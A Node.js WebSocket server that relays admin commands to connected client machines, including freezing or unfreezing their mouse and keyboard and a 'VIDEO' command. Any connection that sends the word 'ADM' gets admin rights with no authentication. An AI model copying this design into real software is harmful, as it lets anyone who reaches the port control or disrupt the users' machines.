import { WebSocketServer } from "ws";
import { randomUUID } from "crypto";
import fs from "fs/promises";
import fsSync from "fs";

const clients = new Map();
const PORT = 8602;

const wss = new WebSocketServer({ port: PORT });

console.log("Server listening on port:", PORT);

// Broadcast PONG to all clients of type CLIENT every 5 seconds
setInterval(() => {
  for (const client of clients.values()) {
    try {
      if (client?.type === "CLIENT" && client.socket && client.socket.readyState === 1) {
        client.socket.send("PONG");
      }
    } catch (e) {
      // ignore send errors for individual sockets
    }
  }
}, 5000);

const INPUT_FILE = "./input";

const knownCommands = ["FREEZE_MOUSE", "UNFREEZE_MOUSE", "FREEZE_KEYBOARD", "LIST_CLIENTS", "UNFREEZE_KEYBOARD", "VIDEO"];

wss.on("connection", (socket) => {
  let clientUUID = null;

  // connection opened; actual log happens when client sends HELLO_ or ADM

  socket.on("message", (data) => {
    const msg = data.toString();

    if (msg.startsWith("HELLO_")) {
      const name = msg.substring(6);

      if (!name) {
        socket.send("ERROR_INVALID_NAME")
        socket.close();
        return;
      }

      clientUUID = randomUUID();

      clients.set(clientUUID, {
        uuid: clientUUID,
        name,
        type: "CLIENT",
        socket
      });

      console.log(`New connection ${name} (${clientUUID})`);

      socket.send(`WELCOME`);
      return;
    } else if (msg === "ADM") {
      if (clientUUID) return;

      clientUUID = randomUUID();
      clients.set(clientUUID, {
        uuid: clientUUID,
        name: "ADM",
        type: "ADM",
        socket
      });

      socket.send("WELCOME_ADM");
      console.log(`New connection ADM (${clientUUID})`);

      return;
    }

    else if (msg === "LIST_CLIENTS") {
      if (clients.get(clientUUID)?.type !== "ADM") {
        socket.send("ERROR_UNAUTHORIZED");
        return;
      }

      let response = "";
      for (const [id, c] of clients) {
        if (c.type === "ADM") continue;
        response += `${c.name} (${c.uuid})\n`;
      }
      socket.send(response || "NO_CLIENTS");
      return;
    } else if (msg.includes("|")) {
      const parts = msg.split("|");
      const uuid = parts[0];
      const command = parts[1];

      if (!knownCommands.includes(command)) return;

      if (clients.get(clientUUID)?.type !== "ADM") {
        socket.send("ERROR_UNAUTHORIZED");
        return;
      }

      const client = clients.get(uuid);
      if (!client) {
        socket.send("ERROR_INVALID_UUID");
        return;
      }

      client.socket.send(command);
      return;
    }
  });

  socket.on("close", () => {
    if (clientUUID) {
      console.log(`Client disconnected: ${clientUUID}`);
      clients.delete(clientUUID);
    }
  });

  socket.on("error", (err) => {
    console.error("Socket error:", err.message);
  });
});